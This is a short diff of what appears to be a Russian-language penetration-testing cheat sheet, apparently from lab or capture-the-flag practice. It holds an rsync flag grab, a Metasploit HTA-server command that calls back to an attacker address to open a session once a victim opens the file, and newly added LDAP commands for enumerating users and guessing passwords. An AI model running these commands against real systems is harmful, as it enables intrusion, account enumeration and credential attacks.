@@ -1913,3 +1913,6 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	msfconsole -x "use exploit/windows/misc/hta_server; set LHOST 10.10.14.207; set LPORT 8443; set SRVHOST 10.10.14.207; run -j" 
 	После того, как пользователь перейдет по ссылке и откроет файл, будет создана сессия Metasploit: 
 	
+FREE IPA
+ldapsearch -x -H ldap://10.24.x.x -b 'dc=dc,dc=rom,dc=ru' -s sub "(objectClass=*)" - поиск пользователей из ldap
+ldapwhoami -x -H ldap://your-ldap-server.com -D "cn=admin,dc=example,dc=com" -w your_password	- перебор паролей с ldap
